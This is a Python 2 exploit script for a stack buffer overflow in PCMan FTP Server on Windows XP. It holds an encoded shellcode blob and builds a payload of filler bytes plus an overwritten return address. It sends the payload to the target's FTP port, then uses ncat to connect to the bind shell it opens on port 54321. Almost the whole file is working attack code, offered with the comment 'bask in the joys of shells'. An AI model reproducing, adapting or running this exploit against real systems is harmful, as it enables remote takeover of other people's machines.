#!/usr/bin/python
# Exploits a stack overflow in PCMan FTP Server
# Shellcode comes up to 370 bytes
# Tested on Windows XP SP 1,2,3
# Run script and bask in the joys of shells :)

import socket
from struct import pack
from sys import argv
from subprocess import call
from time import sleep

host = argv[1]

shell =  ""
shell += "\xf5\x93\xd6\xfd\x92\x9b\x48\xfd\x9b\x4b\x9f\x9b\xfd"
shell += "\xf9\xf5\xd9\xf6\xd9\x74\x24\xf4\xbe\x53\x06\x93\xad"
shell += "\x5f\x31\xc9\xb1\x53\x83\xef\xfc\x31\x77\x13\x03\x24"
shell += "\x15\x71\x58\x36\xf1\xf7\xa3\xc6\x02\x98\x2a\x23\x33"
shell += "\x98\x49\x20\x64\x28\x19\x64\x89\xc3\x4f\x9c\x1a\xa1"
shell += "\x47\x93\xab\x0c\xbe\x9a\x2c\x3c\x82\xbd\xae\x3f\xd7"
shell += "\x1d\x8e\x8f\x2a\x5c\xd7\xf2\xc7\x0c\x80\x79\x75\xa0"
shell += "\xa5\x34\x46\x4b\xf5\xd9\xce\xa8\x4e\xdb\xff\x7f\xc4"
shell += "\x82\xdf\x7e\x09\xbf\x69\x98\x4e\xfa\x20\x13\xa4\x70"
shell += "\xb3\xf5\xf4\x79\x18\x38\x39\x88\x60\x7d\xfe\x73\x17"
shell += "\x77\xfc\x0e\x20\x4c\x7e\xd5\xa5\x56\xd8\x9e\x1e\xb2"
shell += "\xd8\x73\xf8\x31\xd6\x38\x8e\x1d\xfb\xbf\x43\x16\x07"
shell += "\x4b\x62\xf8\x81\x0f\x41\xdc\xca\xd4\xe8\x45\xb7\xbb"
shell += "\x15\x95\x18\x63\xb0\xde\xb5\x70\xc9\xbd\xd1\xb5\xe0"
shell += "\x3d\x22\xd2\x73\x4e\x10\x7d\x28\xd8\x18\xf6\xf6\x1f"
shell += "\x5e\x2d\x4e\x8f\xa1\xce\xaf\x86\x65\x9a\xff\xb0\x4c"
shell += "\xa3\x6b\x40\x70\x76\x01\x48\xd7\x29\x34\xb5\xa7\x99"
shell += "\xf8\x15\x40\xf0\xf6\x4a\x70\xfb\xdc\xe3\x19\x06\xdf"
shell += "\xdf\xeb\x8f\x39\xb5\x1b\xc6\x92\x21\xde\x3d\x2b\xd6"
shell += "\x21\x14\x03\x70\x69\x7e\x94\x7f\x6a\x54\xb2\x17\xe1"
shell += "\xbb\x06\x06\xf6\x91\x2e\x5f\x61\x6f\xbf\x12\x13\x70"
shell += "\xea\xc4\xb0\xe3\x71\x14\xbe\x1f\x2e\x43\x97\xee\x27"
shell += "\x01\x05\x48\x9e\x37\xd4\x0c\xd9\xf3\x03\xed\xe4\xfa"
shell += "\xc6\x49\xc3\xec\x1e\x51\x4f\x58\xcf\x04\x19\x36\xa9"
shell += "\xfe\xeb\xe0\x63\xac\xa5\x64\xf5\x9e\x75\xf2\xfa\xca"
shell += "\x03\x1a\x4a\xa3\x55\x25\x63\x23\x52\x5e\x99\xd3\x9d"
shell += "\xb5\x19\xf3\x7f\x1f\x54\x9c\xd9\xca\xd5\xc1\xd9\x21"
shell += "\x19\xfc\x59\xc3\xe2\xfb\x42\xa6\xe7\x40\xc5\x5b\x9a"
shell += "\xd9\xa0\x5b\x09\xd9\xe0"

payload = "A" * 2006 + pack('<L', 0x7cb41020) + shell

print "[x] Attempting to exploit {}...".format(host)
try: 
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, 21))
	s.recv(1024)
	print "[x] Sending payload..."
	s.send(payload)
	s.close()
	print "[x] Attempting to connect to target...\n"
	try:
		sleep(1)
		call(["ncat", host, "54321"])
	except: 
		print "[!] Couldn't connect. Maybe exploit failed?"
except:
	print "[!] Couldn't connect. Maybe exploit failed?"
